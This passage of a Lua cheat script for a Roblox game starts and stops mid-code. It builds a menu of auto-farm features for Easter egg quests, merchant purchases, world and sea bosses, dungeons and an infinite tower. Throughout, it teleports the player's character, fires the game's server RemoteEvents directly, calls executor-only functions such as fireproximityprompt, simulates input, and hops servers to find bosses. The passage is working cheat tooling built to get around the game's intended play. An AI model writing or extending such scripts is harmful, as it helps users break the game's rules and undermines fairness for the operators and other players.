            task.wait(0.3)
        end
    end
    for _, desc in pairs(egg:GetDescendants())do
        if desc:IsA('BasePart') then
            root.CFrame = CFrame.new(desc.Position)
            root.AssemblyLinearVelocity = Vector3.zero

            task.wait(0.15)
        end
    end
    for _, desc in pairs(egg:GetDescendants())do
        if desc:IsA('RemoteEvent') then
            local n = desc.Name:lower()

            if n:find('collect') or n:find('pickup') or n:find('grab') or n:find('egg') then
                pcall(function()
                    desc:FireServer()
                end)
                task.wait(0.2)
            end
        end
    end

    pcall(function()
        local VU = game:GetService('VirtualUser')

        VU:CaptureController()
        VU:Button1Down(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
        task.wait(0.1)
        VU:Button1Up(Vector2.new(0, 0), workspace.CurrentCamera.CFrame)
    end)
    pcall(function()
        local VIM = game:GetService('VirtualInputManager')

        VIM:SendKeyEvent(true, Enum.KeyCode.E, false, game)
        task.wait(0.1)
        VIM:SendKeyEvent(false, Enum.KeyCode.E, false, game)
    end)

    CollectedEggIds[egg] = true

    return true
end

function Func_AutoEasterEggQuest()
    local function Notify(msg)
        UI:Notify({
            Title = 'Easter Egg Hunt',
            Description = msg,
            Duration = 4,
        })
    end
    local function AcceptEasterQuest()
        local npc = PATH.InteractNPCs:FindFirstChild('EasterQuestNPC') or workspace:FindFirstChild('EasterQuestNPC')

        if not npc then
            for _, v in pairs(workspace:GetDescendants())do
                if v.Name:lower():find('easterquest') or (v.Name:lower():find('easter') and v.Name:lower():find('npc')) then
                    npc = v.Parent

                    break
                end
            end
        end

        local char = GetCharacter()
        local root = char and char:FindFirstChild('HumanoidRootPart')

        if not root then
            return false
        end
        if npc then
            local ok, piv = pcall(function()
                return npc:GetPivot()
            end)

            if ok and piv then
                root.CFrame = piv * CFrame.new(0, 0, 3)
            else
                local bp = npc:FindFirstChildOfClass('BasePart')

                if bp then
                    root.CFrame = bp.CFrame * CFrame.new(0, 0, 3)
                end
            end

            root.AssemblyLinearVelocity = Vector3.zero

            task.wait(0.4)

            for _, desc in pairs(npc:GetDescendants())do
                if desc:IsA('ProximityPrompt') then
                    pcall(function()
                        fireproximityprompt(desc)
                    end)
                    task.wait(0.6)

                    break
                elseif desc:IsA('ClickDetector') then
                    pcall(function()
                        fireclickdetector(desc)
                    end)
                    task.wait(0.6)

                    break
                end
            end
        end

        pcall(function()
            Remotes.QuestAccept:FireServer('EasterQuestNPC')
        end)
        task.wait(0.8)

        return IsEasterQuestVisible()
    end
    local function TurnInQuest()
        local npc = PATH.InteractNPCs:FindFirstChild('EasterQuestNPC') or workspace:FindFirstChild('EasterQuestNPC')
        local char = GetCharacter()
        local root = char and char:FindFirstChild('HumanoidRootPart')

        if not root then
            return
        end
        if npc then
            local ok, piv = pcall(function()
                return npc:GetPivot()
            end)

            if ok and piv then
                root.CFrame = piv * CFrame.new(0, 0, 3)
            else
                local bp = npc:FindFirstChildOfClass('BasePart')

                if bp then
                    root.CFrame = bp.CFrame * CFrame.new(0, 0, 3)
                end
            end

            root.AssemblyLinearVelocity = Vector3.zero

            task.wait(0.4)

            for _, desc in pairs(npc:GetDescendants())do
                if desc:IsA('ProximityPrompt') then
                    pcall(function()
                        fireproximityprompt(desc)
                    end)
                    task.wait(0.6)

                    break
                elseif desc:IsA('ClickDetector') then
                    pcall(function()
                        fireclickdetector(desc)
                    end)
                    task.wait(0.6)

                    break
                end
            end
        end
    end

    CollectedEggIds = {}

    Notify('Accepting Easter Egg Hunt quest...')

    local accepted = AcceptEasterQuest()

    if not accepted then
        Notify('Quest accept attempted.\nCollecting visible eggs...')
    end

    task.wait(0.5)

    local easterFolder = workspace:FindFirstChild('EasterEggs')
    local newEggConn = nil

    if easterFolder then
        newEggConn = easterFolder.ChildAdded:Connect(function(child)
            if not (Toggles.AutoEasterEggQuest and Toggles.AutoEasterEggQuest.Value) then
                return
            end
            if not child.Name:match('^EasterEgg_HiddenEgg') then
                return
            end
            if CollectedEggIds[child] then
                return
            end

            task.wait(0.1)

            local char = GetCharacter()
            local root = char and char:FindFirstChild('HumanoidRootPart')

            if not root then
                return
            end

            Notify('New egg spawned: ' .. child.Name .. '\nCollecting...')
            CollectEgg(child, root)
        end)
    end

    local function SweepUncollected()
        local uncollected = GetUncollectedEggs()

        if #uncollected == 0 then
            return 0
        end

        Notify(string.format('Found %d uncollected egg(s), collecting...', #uncollected))

        local done = 0

        for _, egg in ipairs(uncollected)do
            if not (Toggles.AutoEasterEggQuest and Toggles.AutoEasterEggQuest.Value) then
                break
            end

            local char = GetCharacter()
            local root = char and char:FindFirstChild('HumanoidRootPart')

            if not root then
                task.wait(1)

                continue
            end
            if not egg.Parent then
                CollectedEggIds[egg] = true

                continue
            end

            CollectEgg(egg, root)

            done = done + 1

            task.wait(0.1)
        end

        return done
    end

    SweepUncollected()

    local lastSweep = tick()
    local lastProgressCheck = tick()

    while Toggles.AutoEasterEggQuest and Toggles.AutoEasterEggQuest.Value do
        task.wait(0.5)

        if tick() - lastSweep >= 3 then
            lastSweep = tick()

            local found = SweepUncollected()

            if found > 0 then
                local cur, max = GetEasterQuestProgress()

                Notify(string.format('Swept %d egg(s)\nQuest: %d/%d', found, cur, max))
            end
        end
        if tick() - lastProgressCheck >= 2 then
            lastProgressCheck = tick()

            local cur, max = GetEasterQuestProgress()

            if max > 0 and cur >= max then
                Notify(string.format('All %d/%d eggs collected!\nTurning in quest...', cur, max))
                TurnInQuest()
                task.wait(1)

                CollectedEggIds = {}

                Notify('Re-accepting quest for next cycle...')
                AcceptEasterQuest()
                task.wait(0.5)

                lastSweep = 0
            end
        end
    end

    if newEggConn then
        newEggConn:Disconnect()

        newEggConn = nil
    end

    Notify('Auto Easter Egg Hunt stopped.')
end
function Func_BuyEasterSelectedOnce()
    OpenEasterMerchantUI()
    task.wait(1)
    SyncEasterMerchantStock()

    local sel = Options.SelectedEasterItems or {}
    local hasAny = false

    for _, v in pairs(sel)do
        if v then
            hasAny = true

            break
        end
    end

    local list = hasAny and (function()
        local r = {}

        for _, n in ipairs(EasterMerchantItemNames)do
            if sel[n] then
                table.insert(r, n)
            end
        end

        return r
    end)() or EasterMerchantItemNames

    for _, name in ipairs(list)do
        local stock = EasterMerchantStock[name] or 0

        if stock == 0 then
            continue
        end

        local qty = (stock == 999) and 1 or stock

        BuyEasterItem(name, qty)
        task.wait(1.2)
    end

    UI:Notify({
        Title = 'Easter Merchant',
        Description = 'Purchase complete!',
        Duration = 3,
    })
end

easterupdate_group = easterupdate:AddGroup({Name = 'Easter Egg'})

local EasterEggCountLabel = easterupdate_group:AddLabel({Text = 'Easter Eggs: Easter Eggs: Loading...'})

task.spawn(function()
    while true do
        task.wait(1)

        local count = 0

        pcall(function()
            for _, gui in pairs(PGui:GetDescendants())do
                if gui:IsA('TextLabel') then
                    local n = gui.Text:lower()
                    local num = gui.Text:match('[Ee]aster [Ee]ggs?%s*:%s*(%d+)')

                    if num then
                        count = tonumber(num) or 0

                        break
                    end
                end
            end
        end)

        if count == 0 then
            pcall(function()
                local easterEggs = Plr:GetAttribute('EasterEggs') or Plr:GetAttribute('Easter_Eggs') or Plr:GetAttribute('EasterEggCount')

                if easterEggs then
                    count = tonumber(easterEggs) or 0
                end
            end)
        end
        if count == 0 then
            pcall(function()
                local data = Plr:FindFirstChild('Data')

                if data then
                    local eggVal = data:FindFirstChild('EasterEggs') or data:FindFirstChild('Easter_Eggs') or data:FindFirstChild('EasterEggCount')

                    if eggVal then
                        count = tonumber(eggVal.Value) or 0
                    end
                end
            end)
        end

        pcall(function()
            EasterEggCountLabel.Text = 'Total Easter Egg: ' .. GetItemQty('Easter Egg')
        end)
    end
end)
easterupdate_group:AddToggle({
    Name = 'Auto Easter Egg Hunt (Quest)',
    Default = false,
    Flag = 'AutoEasterEggQuest',
    Callback = function(v)
        Toggles.AutoEasterEggQuest = {Value = v}

        Thread('AutoEasterEggQuest', SafeLoop('Easter Egg Hunt', Func_AutoEasterEggQuest), v)
    end,
})
easterupdate_group:AddToggle({
    Name = 'Auto Farm Easter Eggs (Bunny)',
    Default = false,
    Flag = 'AutoFarmEggs',
    Callback = function(v)
        Toggles.AutoFarmEggs = {Value = v}

        Thread('AutoFarmEggs', SafeLoop('Auto Farm Eggs', Func_AutoFarmEggs), v)
    end,
})
easterupdate_group = easterupdate:AddGroup({Name = 'Easter Merchant'})

local EasterMerchDropdown = easterupdate_group:AddMultiDropdown({
    Name = 'Select Items to Buy',
    Options = EasterMerchantItemNames,
    Default = {},
        Flag = 'SelectedEasterItems',
    Callback = function(v)
        Options.SelectedEasterItems = ToSet(v)
    end,
})

easterupdate_group:AddButton({
    Name = 'Buy Selected Once',
    Callback = function()
        task.spawn(Func_BuyEasterSelectedOnce)
    end,
})
easterupdate_group:AddToggle({
    Name = 'Auto Buy Easter Merchant',
    Default = false,
    Flag = 'AutoEasterMerchant',
    Callback = function(v)
        Toggles.AutoEasterMerchant = {Value = v}

        Thread('AutoEasterMerchant', SafeLoop('Easter Merchant', Func_AutoEasterMerchant), v)
    end,
})

local BossFarmTab = CreateNexusPage({Name = 'Boss Farm'})

BossFarmTab_group = BossFarmTab:AddGroup({Name = 'World Bosses'})
BossFarmTab_group:AddMultiDropdown({
    Name = 'Select Boss(es)',
    Options = Tables.BossList,
    Default = {},
        Flag = 'SelectedBosses',
    Callback = function(v)
        Options.SelectedBosses = ToSet(v)
    end,
})
BossFarmTab_group:AddToggle({
    Name = 'Auto farm Selected Boss',
    Default = false,
    Flag = 'BossesFarm',
    Callback = function(v)
        Toggles.BossesFarm = {Value = v}
    end,
})
BossFarmTab_group:AddToggle({
    Name = 'Auto farm All Bosses',
    Default = false,
    Flag = 'AllBossesFarm',
    Callback = function(v)
        Toggles.AllBossesFarm = {Value = v}
    end,
})
BossFarmTab_group = BossFarmTab:AddGroup({Name = 'Summon Boss'})
BossFarmTab_group:AddDropdown({
    Name = 'Select Summon Boss',
    Options = GetCombinedSummonList(),
    Default = Tables.SummonList[1] or '',
    Flag = 'SelectedSummon',
    Callback = function(v)
        Options.SelectedSummon = v
    end,
})
BossFarmTab_group:AddDropdown({
    Name = 'Summon Difficulty',
    Options = Tables.DiffList,
    Default = 'Normal',
    Flag = 'SelectedSummonDiff',
    Callback = function(v)
        Options.SelectedSummonDiff = v
    end,
})
BossFarmTab_group:AddToggle({
    Name = 'Auto Summon',
    Default = false,
    Flag = 'AutoSummon',
    Callback = function(v)
        Toggles.AutoSummon = {Value = v}
    end,
})
BossFarmTab_group:AddToggle({
    Name = 'Autofarm Summon Boss',
    Default = false,
    Flag = 'SummonBossFarm',
    Callback = function(v)
        Toggles.SummonBossFarm = {Value = v}
    end,
})
BossFarmTab_group = BossFarmTab:AddGroup({Name = 'Pity System'})

local PityStatusLabel = BossFarmTab_group:AddLabel({Text = 'Pity: 0 / 25'})

task.spawn(function()
    while true do
        task.wait(2)

        local cur, max = GetCurrentPity()

        PityStatusLabel.Text = string.format('%d / %d', cur, max)
    end
end)
BossFarmTab_group:AddMultiDropdown({
    Name = 'Build Pity Boss(es)',
    Options = Tables.AllBossList,
    Default = {},
        Flag = 'SelectedBuildPity',
    Callback = function(v)
        Options.SelectedBuildPity = ToSet(v)
    end,
})
BossFarmTab_group:AddDropdown({
    Name = 'Use Pity Boss',
    Options = Tables.AllBossList,
    Default = '',
    Flag = 'SelectedUsePity',
    Callback = function(v)
        Options.SelectedUsePity = v
    end,
})
BossFarmTab_group:AddDropdown({
    Name = 'Pity Difficulty',
    Options = Tables.DiffList,
    Default = 'Normal',
    Flag = 'SelectedPityDiff',
    Callback = function(v)
        Options.SelectedPityDiff = v
    end,
})
BossFarmTab_group:AddToggle({
    Name = 'Autofarm Pity Boss',
    Default = false,
    Flag = 'PityBossFarm',
    Callback = function(v)
        Toggles.PityBossFarm = {Value = v}
    end,
})

local Sea2farm = CreateNexusPage({Name = 'Sea 2 Farm'})

Sea2farm_group = Sea2farm:AddGroup({Name = 'Dio (The World Boss)'})

local DioBossStatusLabel = Sea2farm_group:AddLabel({Text = 'Dio Boss: Status: Not Found'})

task.spawn(function()
    while true do
        task.wait(1)

        local boss = FindLiveBossAnywhere(DioBossKeywords)

        Shared.DioBossFound = boss ~= nil

        if boss then
            DioBossStatusLabel.Text = 'Status: Found - ' .. tostring(boss.Name)
        else
            DioBossStatusLabel.Text = 'Status: Not Found'
        end
    end
end)
Sea2farm_group:AddDropdown({
    Name = 'Dio Difficulty',
    Options = DioDiffList,
    Default = 'Normal',
    Flag = 'SelectedDioDiff',
    Callback = function(v)
        Options.SelectedDioDiff = v
    end,
})
Sea2farm_group:AddToggle({
    Name = 'Auto Spawn Dio',
    Default = false,
    Flag = 'AutoSpawnDio',
    Callback = function(v)
        Toggles.AutoSpawnDio = {Value = v}

        Thread('Sea2.SpawnDio', SafeLoop('Auto Spawn Dio', Func_AutoSpawnDio), v)
    end,
})
Sea2farm_group:AddToggle({
    Name = 'Auto Kill Dio',
    Default = false,
    Flag = 'AutoKillDio',
    Callback = function(v)
        Toggles.AutoKillDio = {Value = v}

        Thread('Sea2.KillDio', SafeLoop('Auto Kill Dio', Func_AutoKillDio), v)
    end,
})
Sea2farm_group = Sea2farm:AddGroup({Name = 'Cosmic Boss'})

local CosmicBossStatusLabel = Sea2farm_group:AddLabel({Text = 'Cosmic Boss: Status: Not Found'})

task.spawn(function()
    while true do
        task.wait(1)

        local boss = FindLiveBossAnywhere(CosmicBossKeywords)

        Shared.CosmicBossFound = boss ~= nil

        if boss then
            CosmicBossStatusLabel.Text = 'Status: Cosmic Boss Found'
        else
            CosmicBossStatusLabel.Text = 'Status: Not Found - Waiting...'
        end
    end
end)
Sea2farm_group:AddToggle({
    Name = 'Auto Kill Cosmic Boss',
    Default = false,
    Flag = 'AutoCosmicBoss',
    Callback = function(v)
        Toggles.AutoCosmicBoss = {Value = v}

        Thread('CosmicBoss.AutoKill', SafeLoop('Auto Cosmic Boss', Func_AutoCosmicBoss), v)
    end,
})
Sea2farm_group:AddToggle({
    Name = 'Auto Hop Until Found Cosmic Boss',
    Default = false,
    Flag = 'AutoHopCosmicBoss',
    Callback = function(v)
        Toggles.AutoHopCosmicBoss = {Value = v}

        if v and Toggles.AutoCosmicBoss then
            Toggles.AutoCosmicBoss.Value = false
        end

        Thread('CosmicBoss.AutoHop', SafeLoop('Cosmic Hop', Func_AutoHopUntilCosmicBoss), v)
    end,
})

Sea2farm_group = Sea2farm:AddGroup({Name = 'Sun God Boss'})

local SunGodBossStatusLabel2 = Sea2farm_group:AddLabel({Text = 'Sun God Boss: Not Found'})

task.spawn(function()
    while true do
        task.wait(1)
        local boss = FindLiveSunGodBoss()
        Shared.SunGodBossFound = boss ~= nil
        if boss then
            local bossHP = boss:GetAttribute('_BossHP') or boss:GetAttribute('BossHP')
            local hum = boss:FindFirstChildOfClass('Humanoid')
            local hp = tonumber(bossHP) or (hum and hum.Health) or 0
            local maxHP = boss:GetAttribute('_BossMaxHP') or (hum and hum.MaxHealth) or 0
            local pct = maxHP > 0 and math.floor((hp / maxHP) * 100) or 100
            SunGodBossStatusLabel2.Text = 'Status: Found - ' .. tostring(boss.Name) .. ' | HP: ' .. pct .. '%'
        else
            SunGodBossStatusLabel2.Text = 'Status: Not Found'
        end
    end
end)

Sea2farm_group:AddToggle({
    Name = 'Auto Kill Sun God Boss',
    Default = false,
    Flag = 'AutoSunGodBoss',
    Callback = function(v)
        Toggles.AutoSunGodBoss = {Value = v}
        Thread('SunGodBoss.AutoKill', SafeLoop('Auto Sun God Boss', Func_AutoSunGodBoss), v)
    end,
})
Sea2farm_group:AddToggle({
    Name = 'Auto Hop Until Found Sun God Boss',
    Default = false,
    Flag = 'AutoHopSunGodBoss',
    Callback = function(v)
        Toggles.AutoHopSunGodBoss = {Value = v}
        if v and Toggles.AutoSunGodBoss then
            Toggles.AutoSunGodBoss.Value = false
        end
        Thread('SunGodBoss.AutoHop', SafeLoop('Sun God Hop', Func_AutoHopUntilSunGodBoss), v)
    end,
})

Sea2farm_group = Sea2farm:AddGroup({Name = 'Sea Beast'})

local SeaBossStatusLabel = Sea2farm_group:AddLabel({Text = 'Sea Boss: Status: Not Found'})

task.spawn(function()
    while true do
        task.wait(1)

        local foundBoss = nil

        for _, npc in pairs(PATH.Mobs:GetChildren())do
            if npc:IsA('Model') then
                local n = npc.Name:lower():gsub('[%s_%-]', '')

                if n:find('kraken') or n:find('seaserpent') or n:find('seabeast') then
                    local bossHP = npc:GetAttribute('_BossHP') or npc:GetAttribute('BossHP')
                    local hum = npc:FindFirstChildOfClass('Humanoid')
                    local alive = (bossHP and tonumber(bossHP) and tonumber(bossHP) > 0) or (hum and hum.Health > 0)

                    if alive then
                        foundBoss = npc

                        break
                    end
                end
            end
        end

        if not foundBoss then
            for _, obj in pairs(workspace:GetDescendants())do
                if obj:IsA('Model') then
                    local n = obj.Name:lower():gsub('[%s_%-]', '')

                    if n:find('kraken') or n:find('seaserpent') or n:find('seabeast') then
                        local bossHP = obj:GetAttribute('_BossHP') or obj:GetAttribute('BossHP')
                        local hum = obj:FindFirstChildOfClass('Humanoid')
                        local alive = (bossHP and tonumber(bossHP) and tonumber(bossHP) > 0) or (hum and hum.Health > 0)

                        if alive then
                            foundBoss = obj

                            break
                        end
                    end
                end
            end
        end

        Shared.SeaBossFound = foundBoss ~= nil

        if foundBoss then
            SeaBossStatusLabel.Text = 'Status: ' .. foundBoss.Name .. ' Found!'
        else
            SeaBossStatusLabel.Text = 'Status: Not Found - Waiting at sea...'
        end
    end
end)
Sea2farm_group:AddToggle({
    Name = 'Auto Spawn Wait (Stay at Sea)',
    Default = false,
    Flag = 'AutoSeaBossSpawn',
    Callback = function(v)
        Toggles.AutoSeaBossSpawn = {Value = v}

        Thread('SeaBoss.SpawnWait', SafeLoop('Sea Boss Spawn Wait', Func_AutoSeaBossSpawn), v)
    end,
})
Sea2farm_group:AddToggle({
    Name = 'Auto Kill Sea Beast',
    Default = false,
    Flag = 'AutoSeaBoss',
    Callback = function(v)
        Toggles.AutoSeaBoss = {Value = v}

        Thread('SeaBoss.AutoKill', SafeLoop('Auto Sea Boss', Func_AutoSeaBoss), v)
    end,
})
Sea2farm_group:AddToggle({
    Name = 'Auto Hop Until Found Sea Beast',
    Default = false,
    Flag = 'AutoHopSeaBoss',
    Callback = function(v)
        Toggles.AutoHopSeaBoss = {Value = v}

        if v then
            if Toggles.AutoSeaBossSpawn then
                Toggles.AutoSeaBossSpawn.Value = false
            end
            if Toggles.AutoSeaBoss then
                Toggles.AutoSeaBoss.Value = false
            end
        end

        Thread('SeaBoss.AutoHop', SafeLoop('Sea Hop', Func_AutoHopUntilSeaBoss), v)
    end,
})
Sea2farm_group = Sea2farm:AddGroup({Name = 'Dodge Attack'})
Sea2farm_group:AddSlider({
    Name = 'Dodge Distance',
    Min = 100,
    Max = 1000,
    Default = 600,
    Flag = 'SeaDodgeDistance',
    Callback = function(v)
        DODGE_DISTANCE = v
    end,
})
Sea2farm_group:AddToggle({
    Name = 'Auto Dodge Sea Beast Attack',
    Default = false,
    Flag = 'AutoSeaDodge',
    Callback = function(v)
        Toggles.AutoSeaDodge = {Value = v}
        Shared_DodgeSavedCF = nil

        Thread('SeaBoss.AutoDodge', SafeLoop('Auto Sea Dodge', Func_AutoSeaDodge), v)
    end,
})


local CombinedTitleList = {}

for _, cat in ipairs(Tables.TitleCategory)do
    table.insert(CombinedTitleList, cat)
end
for _, t in ipairs(Tables.TitleList)do
    table.insert(CombinedTitleList, t)
end

local TitleSwitchTab = CreateNexusPage({Name = 'Title Switch'})

TitleSwitchTab_group = TitleSwitchTab:AddGroup({Name = 'Auto Title Switch'})
TitleSwitchTab_group:AddToggle({
    Name = 'Enable Auto Switch Title',
    Default = false,
    Flag = 'AutoTitle',
    Callback = function(v)
        Toggles.AutoTitle = {Value = v}

        if not v then
            Shared.LastSwitch.Title = ''
        end
    end,
})
TitleSwitchTab_group:AddDropdown({
    Name = 'Default Title',
    Options = CombinedTitleList,
    Default = 'None',
    Flag = 'DefaultTitle',
    Callback = function(v)
        Options.DefaultTitle = v
    end,
})
TitleSwitchTab_group:AddDropdown({
    Name = 'Title [Mob]',
    Options = CombinedTitleList,
    Default = 'None',
    Flag = 'Title_Mob',
    Callback = function(v)
        Options.Title_Mob = v
    end,
})
TitleSwitchTab_group:AddDropdown({
    Name = 'Title [Boss]',
    Options = CombinedTitleList,
    Default = 'None',
    Flag = 'Title_Boss',
    Callback = function(v)
        Options.Title_Boss = v
    end,
})
TitleSwitchTab_group:AddDropdown({
    Name = 'Title [Boss HP%]',
    Options = CombinedTitleList,
    Default = 'None',
    Flag = 'Title_BossHP',
    Callback = function(v)
        Options.Title_BossHP = v
    end,
})
TitleSwitchTab_group:AddSlider({
    Name = 'Change at Boss HP%',
    Min = 0,
    Max = 100,
    Default = 15,
    Flag = 'Title_BossHPAmt',
    Callback = function(v)
        Options.Title_BossHPAmt = v
    end,
})

local RuneSwitchTab = CreateNexusPage({Name = 'Rune Switch'})

RuneSwitchTab_group = RuneSwitchTab:AddGroup({Name = 'Auto Rune Switch'})
RuneSwitchTab_group:AddToggle({
    Name = 'Enable Auto Switch Rune',
    Default = false,
    Flag = 'AutoRune',
    Callback = function(v)
        Toggles.AutoRune = {Value = v}
    end,
})
RuneSwitchTab_group:AddDropdown({
    Name = 'Default Rune',
    Options = Tables.RuneList,
    Default = 'None',
    Flag = 'DefaultRune',
    Callback = function(v)
        Options.DefaultRune = v
    end,
})
RuneSwitchTab_group:AddDropdown({
    Name = 'Rune [Mob]',
    Options = Tables.RuneList,
    Default = 'None',
    Flag = 'Rune_Mob',
    Callback = function(v)
        Options.Rune_Mob = v
    end,
})
RuneSwitchTab_group:AddDropdown({
    Name = 'Rune [Boss]',
    Options = Tables.RuneList,
    Default = 'None',
    Flag = 'Rune_Boss',
    Callback = function(v)
        Options.Rune_Boss = v
    end,
})
RuneSwitchTab_group:AddDropdown({
    Name = 'Rune [Boss HP%]',
    Options = Tables.RuneList,
    Default = 'None',
    Flag = 'Rune_BossHP',
    Callback = function(v)
        Options.Rune_BossHP = v
    end,
})
RuneSwitchTab_group:AddSlider({
    Name = 'Change at Boss HP%',
    Min = 0,
    Max = 100,
    Default = 15,
    Flag = 'Rune_BossHPAmt',
    Callback = function(v)
        Options.Rune_BossHPAmt = v
    end,
})

local RelicSwitchTab = CreateNexusPage({Name = 'Relic Switch'})

RelicSwitchTab_group = RelicSwitchTab:AddGroup({Name = 'Auto Relic Switch'})
RelicSwitchTab_group:AddToggle({
    Name = 'Enable Auto Switch Relic',
    Default = false,
    Flag = 'AutoRelic',
    Callback = function(v)
        Toggles.AutoRelic = {Value = v}

        if not v then
            Shared.LastSwitch.Relic = ''
        end
    end,
})
RelicSwitchTab_group:AddDropdown({
    Name = 'Default Relic',
    Options = Tables.RelicList,
    Default = 'None',
    Flag = 'DefaultRelic_Switch',
    Callback = function(v)
        Options.DefaultRelic = v
    end,
})
RelicSwitchTab_group:AddDropdown({
    Name = 'Relic [Mob]',
    Options = Tables.RelicList,
    Default = 'None',
    Flag = 'Relic_Mob',
    Callback = function(v)
        Options.Relic_Mob = v
    end,
})
RelicSwitchTab_group:AddDropdown({
    Name = 'Relic [Boss]',
    Options = Tables.RelicList,
    Default = 'None',
    Flag = 'Relic_Boss',
    Callback = function(v)
        Options.Relic_Boss = v
    end,
})
RelicSwitchTab_group:AddDropdown({
    Name = 'Relic [Boss HP%]',
    Options = Tables.RelicList,
    Default = 'None',
    Flag = 'Relic_BossHP',
    Callback = function(v)
        Options.Relic_BossHP = v
    end,
})
RelicSwitchTab_group:AddSlider({
    Name = 'Change at Boss HP%',
    Min = 0,
    Max = 100,
    Default = 15,
    Flag = 'Relic_BossHPAmt',
    Callback = function(v)
        Options.Relic_BossHPAmt = v
    end,
})

local BuildSwitchTab = CreateNexusPage({Name = 'Build Switch'})

BuildSwitchTab_group = BuildSwitchTab:AddGroup({Name = 'Auto Build Switch'})
BuildSwitchTab_group:AddToggle({
    Name = 'Enable Auto Switch Build',
    Default = false,
    Flag = 'AutoBuild',
    Callback = function(v)
        Toggles.AutoBuild = {Value = v}
    end,
})
BuildSwitchTab_group:AddDropdown({
    Name = 'Default Build',
    Options = Tables.BuildList,
    Default = 'None',
    Flag = 'DefaultBuild',
    Callback = function(v)
        Options.DefaultBuild = v
    end,
})
BuildSwitchTab_group:AddDropdown({
    Name = 'Build [Mob]',
    Options = Tables.BuildList,
    Default = 'None',
    Flag = 'Build_Mob',
    Callback = function(v)
        Options.Build_Mob = v
    end,
})
BuildSwitchTab_group:AddDropdown({
    Name = 'Build [Boss]',
    Options = Tables.BuildList,
    Default = 'None',
    Flag = 'Build_Boss',
    Callback = function(v)
        Options.Build_Boss = v
    end,
})
BuildSwitchTab_group:AddDropdown({
    Name = 'Build [Boss HP%]',
    Options = Tables.BuildList,
    Default = 'None',
    Flag = 'Build_BossHP',
    Callback = function(v)
        Options.Build_BossHP = v
    end,
})
BuildSwitchTab_group:AddSlider({
    Name = 'Change at Boss HP%',
    Min = 0,
    Max = 100,
    Default = 15,
    Flag = 'Build_BossHPAmt',
    Callback = function(v)
        Options.Build_BossHPAmt = v
    end,
})

local DungeonTab = CreateNexusPage({Name = 'Dungeon'})

DungeonTab_group = DungeonTab:AddGroup({Name = 'Setup'})
DungeonTab_group:AddDropdown({
    Name = 'Dungeon Type',
    Options = {
        'BossRush',
        'CidDungeon',
        'RuneDungeon',
        'DoubleDungeon',
    },
    Default = 'BossRush',
    Flag = 'SelectedDungeonType',
    Callback = function(v)
        Options.SelectedDungeonType = v
    end,
})

Options.SelectedDungeonType = 'BossRush'

DungeonTab_group:AddDropdown({
    Name = 'Difficulty',
    Options = {
        'Easy',
        'Medium',
        'Hard',
        'Extreme',
    },
    Default = 'Easy',
    Flag = 'SelectedDungeonDiff',
    Callback = function(v)
        Options.SelectedDungeonDiff = v
    end,
})

Options.SelectedDungeonDiff = 'Easy'

DungeonTab_group = DungeonTab:AddGroup({Name = 'Controls'})
DungeonTab_group:AddButton({
    Name = 'Join Dungeon Once',
    Callback = function()
        local dungeonId = Options.SelectedDungeonType or 'BossRush'
        local difficulty = Options.SelectedDungeonDiff or 'Easy'

        task.spawn(function()
            StartDungeonPortal(dungeonId, difficulty)
        end)
    end,
})
DungeonTab_group:AddToggle({
    Name = 'Auto Replay',
    Default = true,
    Flag = 'AutoDungeonReplay',
    Callback = function(v)
        Toggles.AutoDungeonReplay = {Value = v}
    end,
})

Toggles.AutoDungeonReplay = {Value = true}

DungeonTab_group:AddToggle({
    Name = 'Auto Dungeon',
    Default = false,
    Flag = 'AutoDungeon',
    Callback = function(v)
        Toggles.AutoDungeon = {Value = v}

        Thread('AutoDungeon', SafeLoop('Auto Dungeon', Func_AutoDungeon), v)
    end,
})

local InfiniteTowerTab = CreateNexusPage({Name = 'Infinite Tower'})

function StartInfiniteTowerPortal()
    pcall(function()
        Remotes.OpenDungeon:FireServer('InfiniteTower', 'Normal')
    end)
    task.wait(1)
    pcall(function()
        game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('StartDungeonPortal'):FireServer()
    end)
    task.wait(0.5)
    pcall(function()
        Remotes.StartDungeon:FireServer()
    end)
    task.wait(0.5)
    pcall(function()
        game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveVote'):FireServer('start')
    end)
    task.wait(1)
    TryEnterPortal()
end
function Func_AutoInfiniteTower()
    local function ReplayInfiniteTower()
        pcall(function()
            game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveReplayVote'):FireServer('sponsor')
        end)
        task.wait(1)
        pcall(function()
            Remotes.StartDungeon:FireServer()
        end)
        task.wait(3)
    end

    StartInfiniteTowerPortal()

    while Toggles.AutoInfiniteTower and Toggles.AutoInfiniteTower.Value do
        task.wait(0.1)

        local char = GetCharacter()
        local hum = char and char:FindFirstChildOfClass('Humanoid')

        if not char or not hum or hum.Health <= 0 then
            task.wait(0.5)

            continue
        end

        local targets = GetAllNPCTargets()

        if #targets > 0 then
            AttackAllTargets()
        else
            if Toggles.AutoInfiniteTowerReplay and Toggles.AutoInfiniteTowerReplay.Value then
                ReplayInfiniteTower()

                if #GetAllNPCTargets() == 0 then
                    StartInfiniteTowerPortal()
                end
            else
                task.wait(1)
            end
        end
    end
end

InfiniteTowerTab_group = InfiniteTowerTab:AddGroup({Name = 'Setup'})
InfiniteTowerTab_group:AddButton({
    Name = 'Join Infinite Tower Once',
    Callback = function()
        task.spawn(function()
            StartInfiniteTowerPortal()
        end)
    end,
})
InfiniteTowerTab_group:AddToggle({
    Name = 'Auto Vote Start',
    Default = false,
    Flag = 'AutoInfiniteTowerVoteStart',
    Callback = function(v)
        Toggles.AutoInfiniteTowerVoteStart = {Value = v}

        Thread('InfiniteTower.VoteStart', SafeLoop('IT Vote Start', function()
            while Toggles.AutoInfiniteTowerVoteStart and Toggles.AutoInfiniteTowerVoteStart.Value do
                task.wait(2)
                pcall(function()
                    game:GetService('ReplicatedStorage'):WaitForChild('Remotes'):WaitForChild('DungeonWaveVote'):FireServer('start')
                end)
                pcall(function()
                    Remotes.StartDungeon:FireServer()
                end)
            end
        end), v)
    end,
})
InfiniteTowerTab_group:AddToggle({
    Name = 'Auto Replay',
    Default = true,
    Flag = 'AutoInfiniteTowerReplay',
    Callback = function(v)
        Toggles.AutoInfiniteTowerReplay = {Value = v}
    end,
})

Toggles.AutoInfiniteTowerReplay = {Value = true}

InfiniteTowerTab_group:AddToggle({
    Name = 'Auto Infinite Tower',
    Default = false,
    Flag = 'AutoInfiniteTower',
    Callback = function(v)
        Toggles.AutoInfiniteTower = {Value = v}

